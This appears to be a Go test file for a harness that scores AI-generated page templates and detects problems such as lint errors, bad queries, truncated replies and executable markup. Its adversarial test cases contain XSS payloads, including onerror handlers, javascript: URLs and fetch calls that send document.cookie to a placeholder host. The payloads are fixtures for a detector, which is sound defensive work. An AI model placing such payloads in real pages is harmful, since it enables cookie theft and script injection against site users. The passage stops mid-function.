package templateeval

import (
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"testing"
	"time"

	"mahresources/application_context"
	"mahresources/mrql"
	"mahresources/shortcodes"
)

func pairCase() Case {
	return Case{ID: "t-pair", Kind: KindPair, Carrier: "group", Slot: "CustomHeader", Prompt: "x"}
}

func pairDraft(html, css string, issues ...shortcodes.LintIssue) Draft {
	return Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": html, "CustomHeaderCSS": css}, Issues: issues}
}

func okPreview(html string) map[string]Preview {
	return map[string]Preview{"CustomHeader": {Status: 200, HTML: html}}
}

func TestScoreChecks(t *testing.T) {
	env := testEnv()
	metaCase := Case{ID: "t-meta", Kind: KindMetaSchema, Carrier: "group", Prompt: "x", ExpectFields: []string{"isbn"}}
	metaDraft := func(schema string) Draft {
		return Draft{Status: 200, Target: "metaschema", Valid: true, Content: schema}
	}
	advCase := pairCase()
	advCase.Adversarial = true
	cssCase := Case{ID: "t-css", Kind: KindSlot, Carrier: "group", Slot: "CustomCSS", Prompt: "x"}
	bundleCase := Case{ID: "t-bundle", Kind: KindBundle, Carrier: "note", Prompt: "x"}
	expectBundle := Case{ID: "t-bundle-expect", Kind: KindBundle, Carrier: "note", Prompt: "x", ExpectSlots: []string{"CustomHeader", "CustomSidebar"}}

	tests := []struct {
		name     string
		c        Case
		draft    Draft
		calls    []Call
		previews map[string]Preview
		probes   []QueryProbe
		check    func(t *testing.T, got Checks, details Details)
		pass     bool
	}{
		{
			name: "clean pair passes", c: pairCase(),
			draft:    pairDraft(`<h1>[meta path="author"]</h1>`, `.h{}`),
			previews: okPreview(`<h1>Ann</h1>`),
			pass:     true,
		},
		{
			name: "provider error", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			check: func(t *testing.T, got Checks, details Details) {
				if details.ProviderError == "" || got.HTTPStatus != 502 {
					t.Fatalf("provider error not recorded: %#v", got)
				}
			},
		},
		{
			name: "lint errors and warnings", c: pairCase(),
			draft: pairDraft(`<h1>x</h1>`, ``,
				shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "[conditional] must be a block: [conditional]…[/conditional]"},
				shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `[meta] has both hide-empty and default; hide-empty wins and the default is never shown`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.LintErrors != 1 || got.LintWarnings != 1 {
					t.Fatalf("lint counts = %d/%d", got.LintErrors, got.LintWarnings)
				}
			},
		},
		{
			name: "unknown attribute warning does not fail", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `unknown attribute "colour" on [meta]`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.UnknownAttributes != 1 {
					t.Fatalf("unknown attributes = %d", got.UnknownAttributes)
				}
			},
			pass: true,
		},
		{
			name: "MRQL error", c: pairCase(),
			draft:    pairDraft(badLintHTML, ``, badLintIssue),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.MRQLErrors != 1 {
					t.Fatalf("mrql errors = %d", got.MRQLErrors)
				}
			},
		},
		{
			name: "unknown shortcode far from any built-in", c: pairCase(),
			draft:    pairDraft(`<div>[star-rating value="4"] [meta path="a"] [plugin:x:y] [/rating]</div>`, `a[href]{} [data-x="y"]{}`),
			previews: okPreview(`<div>stars</div>`),
			check: func(t *testing.T, got Checks, details Details) {
				want := []string{"plugin:x:y", "rating", "star-rating"}
				if !reflect.DeepEqual(details.UnknownShortcodes, want) {
					t.Fatalf("unknown shortcodes = %v, want %v", details.UnknownShortcodes, want)
				}
			},
		},
		{
			name: "CSS attribute selectors are not shortcodes", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `[hidden]{display:none} input[type="text"]{} [data-theme="dark"] .x{}`},
			pass:  true,
		},
		{
			name: "metaschema compile failure", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"nope"}}}`),
			check: func(t *testing.T, got Checks, details Details) {
				if !got.SchemaCompileFailed || details.SchemaCompileError == "" {
					t.Fatal("compile failure not recorded")
				}
			},
		},
		{
			name: "fixture meta fails generated schema", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"string"}},"required":["isbn","missingField"]}`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.FixtureMetaInvalid == 0 {
					t.Fatal("fixture validation failure not counted")
				}
			},
		},
		{
			name: "empty schema cannot pass", c: metaCase,
			draft: metaDraft(`{}`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.SchemaProperties != 0 || len(got.MissingExpectFields) != 1 {
					t.Fatalf("got %#v", got)
				}
			},
		},
		{
			name: "schema missing an expected field", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.MissingExpectFields, []string{"isbn"}) {
					t.Fatalf("missing = %v", got.MissingExpectFields)
				}
			},
		},
		{
			name: "schema with the expected field passes", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"},"isbn":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.FieldCoverage != 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "incomplete pair in the raw provider output", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>x</p>"},"explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.IncompletePairs != 1 {
					t.Fatalf("incomplete pairs = %d", got.IncompletePairs)
				}
			},
		},
		{
			name: "bundle coverage", c: bundleCase,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.RequestedSlots != len(BundleSlots("note")) || got.ReturnedSlots != 2 || got.BundleCoverage <= 0 || got.BundleCoverage >= 1 {
					t.Fatalf("coverage %#v", got)
				}
			},
			pass: true,
		},
		{
			name: "truncation from finish reason", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``),
			calls:    []Call{{FinishReason: "length"}},
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated {
					t.Fatal("truncation not detected")
				}
			},
		},
		{
			name: "the bundle degrade issue after a clean stop is malformed, not truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Truncated || !got.Malformed || got.LintErrors != 0 {
					t.Fatalf("truncated=%v malformed=%v lint=%d", got.Truncated, got.Malformed, got.LintErrors)
				}
			},
		},
		{
			name: "the bundle degrade issue after a length stop is truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "length", Content: `{"slots":{"CustomHeader":"<p>`}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated || got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "invalid JSON from a single target is malformed", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content": ".a{`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Truncated || !got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "the oversize issue is truncation, not a lint error", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Slots: map[string]string{
				"CustomHeader": "<p>" + strings.Repeat("x", application_context.MaxTemplateGeneratedContentLength), "CustomHeaderCSS": ""},
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "Output exceeded 20000 bytes in CustomHeader (20003 bytes). Nothing was cut; shorten it before saving."}}},
			calls:    []Call{{FinishReason: "stop"}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated || got.LintErrors != 0 {
					t.Fatalf("truncated=%v lint=%d", got.Truncated, got.LintErrors)
				}
			},
		},
		{
			name: "the truncation issue is truncation, not a lint error", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The model's reply was cut off at its output limit, so this draft is incomplete. Try a shorter request, or generate fewer slots at once."}}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated || got.LintErrors != 0 || got.Malformed {
					t.Fatalf("truncated=%v lint=%d malformed=%v", got.Truncated, got.LintErrors, got.Malformed)
				}
			},
		},
		{
			name: "an oversized single draft is truncated", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":"` + strings.Repeat("a", application_context.MaxTemplateGeneratedContentLength+1) + `","explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if !got.Truncated || got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "an empty requested pair fails", c: pairCase(),
			draft: pairDraft(``, ``),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.MissingSlots, []string{"CustomHeader"}) {
					t.Fatalf("missing slots = %v", got.MissingSlots)
				}
			},
		},
		{
			name: "a bundle without an expected slot fails", c: expectBundle,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": "", "CustomSidebar": " ", "CustomSidebarCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.MissingSlots, []string{"CustomSidebar"}) {
					t.Fatalf("missing slots = %v", got.MissingSlots)
				}
			},
		},
		{
			name: "a bundle may leave unexpected slots empty", c: expectBundle,
			draft: Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{
				"CustomHeader": "<p>x</p>", "CustomHeaderCSS": "", "CustomSidebar": "<p>y</p>", "CustomSidebarCSS": "", "CustomSummary": "", "CustomSummaryCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}, "CustomSidebar": {Status: 200, HTML: "<p>y</p>"}},
			pass:     true,
		},
		{
			name: "style and script bodies are not visible content", c: pairCase(),
			draft:    pairDraft(`<style>.a{color:red}</style>[meta path="none" hide-empty="true"]`, ``),
			previews: okPreview("<style>.a{color:red}</style><script>var a = 1;</script>"),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an unknown shortcode glued to text in HTML", c: pairCase(),
			draft:    pairDraft(`<p>Rating[star-rating value="4"]</p>`, ``),
			previews: okPreview(`<p>Rating</p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(details.UnknownShortcodes, []string{"star-rating"}) {
					t.Fatalf("unknown shortcodes = %v", details.UnknownShortcodes)
				}
			},
		},
		{
			name: "attribute selectors with spaced operators and style blocks are not shortcodes", c: pairCase(),
			draft:    pairDraft(`<style>[hidden]{display:none} [data-state = "on"]{}</style><p>x</p>`, `[data-state = "on"] .x{} [data-x="y"]{} [hidden]{}`),
			previews: okPreview(`<p>x</p>`),
			pass:     true,
		},
		{
			name: "a shortcode-shaped unknown in CSS is flagged", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `.a{color:[theme-color name="accent"]}`},
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(details.UnknownShortcodes, []string{"theme-color"}) {
					t.Fatalf("unknown shortcodes = %v", details.UnknownShortcodes)
				}
			},
		},
		{
			name: "event handler after a quoted attribute holding >", c: advCase,
			draft:    pairDraft(`<a title="a>b" onclick="x()">t</a>`, ``),
			previews: okPreview(`<a>t</a>`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "unquoted Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init=fetch('/x')>t</div>`, ``),
			previews: okPreview(`<div>t</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "entity-encoded javascript URL", c: advCase,
			draft:    pairDraft(`<a href="java&#115;cript:alert(1)">t</a><a href=" JAVA&#x09;SCRIPT:x">u</a>`, ``),
			previews: okPreview(`<a>t</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "srcdoc and embedded content", c: advCase,
			draft:    pairDraft(`<iframe srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe><object data="x"></object><embed src="y">`, ``),
			previews: okPreview(`<p>t</p>`),
			check:    wantFlags("srcdoc", "embed"),
		},
		{
			name: "markup after a style breakout in CSS is read as HTML", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><img src=x onerror=alert(1)>`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("event-handler", "style-breakout"),
		},
		{
			name: "render-empty slot", c: pairCase(),
			draft:    pairDraft(`<div class="c"><h2>[meta path="missing" hide-empty="true"]</h2></div>`, ``),
			previews: okPreview("<div class=\"c\"><h2></h2></div>\n<!-- c -->"),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an image is not empty", c: pairCase(),
			draft:    pairDraft(`<img src="/x">`, ``),
			previews: okPreview(`<img src="/x">`),
			pass:     true,
		},
		{
			name: "leftover shortcode text", c: pairCase(),
			draft:    pairDraft(`<p>[property path="Name"]</p>`, ``),
			previews: okPreview(`<p>[property path=Name]</p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.LeftoverShortcodeText, []string{"CustomHeader"}) {
					t.Fatalf("leftover = %v", got.LeftoverShortcodeText)
				}
			},
		},
		{
			name: "preview error issue and render error marker", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p><span class="shortcode-error text-red-700 font-mono" title="t">bad</span>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "boom"}}}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.PreviewErrors != 2 {
					t.Fatalf("preview errors = %d", got.PreviewErrors)
				}
			},
		},
		{
			name: "a lint error the preview repeats is counted once, under lint", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}}}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.PreviewErrors != 0 || got.LintErrors != 1 {
					t.Fatalf("preview errors = %d, lint errors = %d", got.PreviewErrors, got.LintErrors)
				}
			},
		},
		{
			name: "an MRQL error only lint reports", c: pairCase(),
			draft:    pairDraft(badLintHTML, ``, badLintIssue),
			previews: okPreview(`<p>x</p>`),
			probes:   []QueryProbe{{Slot: "CustomHeader", Query: "type = = =", Failed: false}},
			check:    wantMRQL(1, 0),
		},
		{
			name: "a lint MRQL error is tied to its own slot", c: Case{ID: "b2", Kind: KindBundle, Carrier: "note", Prompt: "x", ExpectSlots: []string{"CustomHeader"}},
			// Both queries sit at the same offset in their slots, so the server's
			// issue alone cannot say which slot it came from.
			draft: Draft{Status: 200, Target: "bundle", Valid: false, Issues: []shortcodes.LintIssue{badLintIssue}, Slots: map[string]string{
				"CustomHeader": `<p>[mrql query="type = note"]</p>`, "CustomHeaderCSS": "", "CustomSidebar": badLintHTML, "CustomSidebarCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>n</p>"}, "CustomSidebar": {Status: 200, HTML: `<p class="mrql-error">e</p>`}},
			probes:   []QueryProbe{{Slot: "CustomHeader", Query: "type = note"}, {Slot: "CustomSidebar", Query: "type = = =", Failed: true}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.MRQLErrors != 1 || !reflect.DeepEqual(details.MRQLErrors, []string{"CustomSidebar: type = = ="}) {
					t.Fatalf("mrql errors = %d %q", got.MRQLErrors, details.MRQLErrors)
				}
			},
		},
		{
			name: "an MRQL error only the runtime reports", c: pairCase(),
			draft:    pairDraft(`<p>[mrql query="type = resource AND nosuchfield = 1"]</p>`, ``),
			previews: okPreview(`<p><div class="mrql-results mrql-error text-sm">unknown field nosuchfield</div></p>`),
			probes:   []QueryProbe{{Slot: "CustomHeader", Query: "type = resource AND nosuchfield = 1", Failed: true}},
			check:    wantMRQL(1, 0),
		},
		{
			name: "an MRQL error both report counts once", c: pairCase(),
			draft:    pairDraft(badLintHTML, ``, badLintIssue),
			previews: okPreview(`<p><span class="mrql-error">parse error</span></p>`),
			probes:   []QueryProbe{{Slot: "CustomHeader", Query: "type = = =", Failed: true}},
			check:    wantMRQL(1, 0),
		},
		{
			name: "the same bad query in two slots counts twice", c: Case{ID: "b", Kind: KindBundle, Carrier: "note", Prompt: "x", ExpectSlots: []string{"CustomHeader"}},
			draft: Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{
				"CustomHeader": `<p>[mrql query="nosuch = 1"]</p>`, "CustomHeaderCSS": "", "CustomSidebar": `<p>[mrql query="nosuch = 1"]</p>`, "CustomSidebarCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p class="mrql-error">e</p>`}, "CustomSidebar": {Status: 200, HTML: `<p class="mrql-error">e</p>`}},
			probes:   []QueryProbe{{Slot: "CustomHeader", Query: "nosuch = 1", Failed: true}, {Slot: "CustomSidebar", Query: "nosuch = 1", Failed: true}},
			check:    wantMRQL(2, 0),
		},
		{
			name: "a runtime MRQL marker no probe explains still counts, once", c: pairCase(),
			draft:    pairDraft(`<p>[each path="genres"][mrql query="type = note"][/each]</p>`, ``),
			previews: okPreview(`<p><span class="mrql-error">a</span><span class="mrql-error">b</span></p>`),
			check:    wantMRQL(1, 0),
		},
		{
			name: "a shortcode render error is a preview error, not MRQL", c: pairCase(),
			draft:    pairDraft(`<p>x</p>`, ``),
			previews: okPreview(`<p><span class="shortcode-error" title="t">x</span></p>`),
			check:    wantMRQL(0, 1),
		},
		{
			name: "single reply with a non-string content", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":5,"explanation":"e"}`}},
			check: wantShape(false, true),
		},
		{
			name: "single reply with a non-string explanation", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":".a{}","explanation":123}`}},
			check: wantShape(false, true),
		},
		{
			name: "bundle reply with slots as an array", c: bundleCase,
			draft: degradedBundle,
			calls: []Call{{FinishReason: "stop", Content: `{"slots":[],"explanation":"e"}`}},
			check: wantShape(false, true),
		},
		{
			name: "bundle reply with a non-string slot", c: bundleCase,
			draft: degradedBundle,
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":5},"explanation":"e"}`}},
			check: wantShape(false, true),
		},
		{
			name: "bundle reply with a non-string explanation", c: bundleCase,
			draft: degradedBundle,
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"hi","CustomHeaderCSS":""},"explanation":123}`}},
			check: wantShape(false, true),
		},
		{
			name: "pair reply with a non-string explanation", c: pairCase(),
			draft: degradedBundle,
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"hi","CustomHeaderCSS":""},"explanation":123}`}},
			check: wantShape(false, true),
		},
		{
			name: "field coverage is heuristic and does not gate markup", c: pairCase(),
			draft:    pairDraft(`<p>[meta path="author"]</p>`, ``),
			previews: okPreview(`<p>Ann</p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if got.FieldCoverage <= 0 || got.FieldCoverage >= 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "script tag flags an adversarial case", c: advCase,
			draft:    pairDraft(`<p>x</p><SCRIPT>fetch('https://example.invalid')</SCRIPT>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
		},
		{
			name: "inline event handler", c: advCase,
			draft:    pairDraft(`<img src="x" onerror="alert(1)">`, ``),
			previews: okPreview(`<img src="x">`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init="fetch('https://example.invalid/?d='+document.cookie)">x</div><button @click="location='https://e.invalid'">b</button>`, ``),
			previews: okPreview(`<div>x</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "harmless Alpine toggle is not flagged", c: advCase,
			draft:    pairDraft(`<div x-data="{open:false}"><button @click="open = !open">t</button></div>`, ``),
			previews: okPreview(`<div>t</div>`),
			pass:     true,
		},
		{
			name: "javascript URL", c: advCase,
			draft:    pairDraft(`<a href="JavaScript:alert(1)">x</a>`, ``),
			previews: okPreview(`<a>x</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "style breakout in CSS", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><div x-init="1">`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("style-breakout"),
		},
		{
			name: "script inside an SVG title is an HTML script", c: advCase,
			draft:    pairDraft(`<svg><title><script>fetch('/x')</script></title></svg>`, ``),
			previews: okPreview(`<svg></svg>`),
			check:    wantFlags("script"),
		},
		{
			name: "markup-looking text in a CSS string is not markup", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.x::after{content:"<script>alert(1)</script>"} .y::before{content:"<img onerror=x>"}`),
			previews: okPreview(`<p>x</p>`),
			pass:     true,
		},
		{
			name: "CSS expression and javascript url", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{width:expression(alert(1))} .b{background:URL( 'javascript:alert(1)')}`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("javascript-url", "css-expression"),
		},
		{
			name: "executable markup in the rendered preview fails an adversarial case", c: advCase,
			draft:    pairDraft(`<p>[meta path="author" inline="true" raw="true"]</p>`, ``),
			previews: okPreview(`<p><img src=x onerror="fetch('https://example.invalid/?c='+document.cookie)"></p>`),
			check: func(t *testing.T, got Checks, details Details) {
				if len(got.ExecutableMarkup) != 0 || !reflect.DeepEqual(got.RenderedExecutableMarkup, []string{"event-handler"}) {
					t.Fatalf("draft flags %v, rendered flags %v", got.ExecutableMarkup, got.RenderedExecutableMarkup)
				}
			},
		},
		{
			name: "an empty meta widget renders nothing", c: pairCase(),
			draft: pairDraft(`<div>[meta path="missing" hide-empty="true"][meta path="gone"]</div>`, ``),
			previews: okPreview(`<div><meta-shortcode data-path="missing" data-hide-empty="true" data-default="" data-value=""></meta-shortcode>` +
				`<meta-shortcode data-path="gone" data-hide-empty="false" data-default="" data-value="null"></meta-shortcode><x-widget><span> </span></x-widget></div>`),
			check: func(t *testing.T, got Checks, details Details) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "a meta widget with a default is visible", c: pairCase(),
			draft:    pairDraft(`<div>[meta path="missing" default="n/a"]</div>`, ``),
			previews: okPreview(`<div><meta-shortcode data-path="missing" data-hide-empty="false" data-default="n/a" data-value=""></meta-shortcode></div>`),
			pass:     true,
		},
		{
			name: "a meta widget with a value is visible", c: pairCase(),
			draft:    pairDraft(`<div>[meta path="author"]</div>`, ``),
			previews: okPreview(`<div><meta-shortcode data-path="author" data-hide-empty="true" data-default="" data-value="&#34;Ann&#34;"></meta-shortcode></div>`),
			pass:     true,
		},
		{
			name: "a custom element with text is visible", c: pairCase(),
			draft:    pairDraft(`<x-badge>[property path="Name"]</x-badge>`, ``),
			previews: okPreview(`<x-badge><b>Dune</b></x-badge>`),
			pass:     true,
		},
		{
			name: "valid JSON of the wrong shape is not malformed", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `[]`}, {FinishReason: "stop", Content: `123`}, {FinishReason: "stop", Content: `"x"`}, {FinishReason: "stop", Content: `{"content":"","explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Malformed || !got.WrongShape {
					t.Fatalf("malformed=%v wrongShape=%v", got.Malformed, got.WrongShape)
				}
			},
		},
		{
			name: "a degraded bundle whose reply is valid JSON is the wrong shape", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "stop", Content: `[]`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Malformed || !got.WrongShape {
					t.Fatalf("malformed=%v wrongShape=%v", got.Malformed, got.WrongShape)
				}
			},
		},
		{
			name: "a pair reply without slots is the wrong shape", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":"<p>x</p>","explanation":"e"}`}},
			check: func(t *testing.T, got Checks, details Details) {
				if got.Malformed || !got.WrongShape {
					t.Fatalf("malformed=%v wrongShape=%v", got.Malformed, got.WrongShape)
				}
			},
		},
		{
			name: "executable markup is recorded but does not gate a normal case", c: pairCase(),
			draft:    pairDraft(`<p>x</p><script>console.log(1)</script>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
			pass:     true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, details := Score(tt.c, tt.draft, tt.calls, tt.previews, tt.probes, env)
			if tt.check != nil {
				tt.check(t, got, details)
			}
			if got.Pass() != tt.pass {
				t.Fatalf("Pass() = %v, want %v; checks %#v", got.Pass(), tt.pass, got)
			}
		})
	}
}

const badLintHTML = `<p>[mrql query="type = = ="]</p>`

// badLintIssue is the issue the server's lint gives badLintHTML.
var badLintIssue = shortcodes.LintIssue{Start: 9, End: 28, Severity: shortcodes.SeverityError, Message: "MRQL error in query: unexpected ="}

var degradedBundle = Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}}

func wantMRQL(mrql, preview int) func(t *testing.T, got Checks, details Details) {
	return func(t *testing.T, got Checks, details Details) {
		t.Helper()
		if got.MRQLErrors != mrql || got.PreviewErrors != preview {
			t.Fatalf("mrql errors = %d (want %d), preview errors = %d (want %d)", got.MRQLErrors, mrql, got.PreviewErrors, preview)
		}
	}
}

func wantShape(malformed, wrongShape bool) func(t *testing.T, got Checks, details Details) {
	return func(t *testing.T, got Checks, details Details) {
		t.Helper()
		if got.Malformed != malformed || got.WrongShape != wrongShape {
			t.Fatalf("malformed=%v (want %v) wrongShape=%v (want %v)", got.Malformed, malformed, got.WrongShape, wrongShape)
		}
	}
}

func wantFlags(flags ...string) func(t *testing.T, got Checks, details Details) {
	return func(t *testing.T, got Checks, details Details) {
		t.Helper()
		if !reflect.DeepEqual(got.ExecutableMarkup, flags) {
			t.Fatalf("executable markup = %v, want %v", got.ExecutableMarkup, flags)
		}
	}
}

// TestLintMessagePrefixesStayClassified lints known-bad markup with the real
// linter. Score classifies issues by message prefix, so a rewording in
// shortcodes/lint.go must fail here rather than silently zero a metric.
func TestLintMessagePrefixesStayClassified(t *testing.T) {
	opts := shortcodes.LintOptions{
		Known:        shortcodes.KnownFromBuiltins(),
		ValidateMRQL: func(q string) error { _, err := mrql.Parse(q); return err },
	}
	cases := []struct {
		markup string
		class  issueClass
	}{
		{`[meta path="a" colour="red"]`, classUnknownAttribute},
		{`[mrql query="type = = ="]`, classMRQL},
		{`[metta path="a"]`, classUnknownShortcode},
	}
	for _, c := range cases {
		found := false
		var messages []string
		for _, issue := range shortcodes.Lint(c.markup, opts) {
			messages = append(messages, issue.Message)
			if classifyIssue(issue) == c.class {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: no issue classified as %v; lint said %s", c.markup, c.class, strings.Join(messages, " | "))
		}
	}
}

type malformedProvider struct{}

func (malformedProvider) Endpoint() string {
	return application_context.DefaultDeepSeekChatCompletionsURL
}

func (malformedProvider) GenerateDraft(context.Context, application_context.TemplateDraftRequest) (application_context.TemplateDraftResponse, error) {
	return application_context.TemplateDraftResponse{Content: `{"slots":{"CustomHeader":"<p>`, FinishReason: "stop"}, nil
}

// TestBundleDegradeMessageStaysClassified drives the real generator into its
// malformed-bundle branch, so a rewording of that message in
// application_context/template_generation.go fails here instead of zeroing the
// malformed and truncation counts.
func TestBundleDegradeMessageStaysClassified(t *testing.T) {
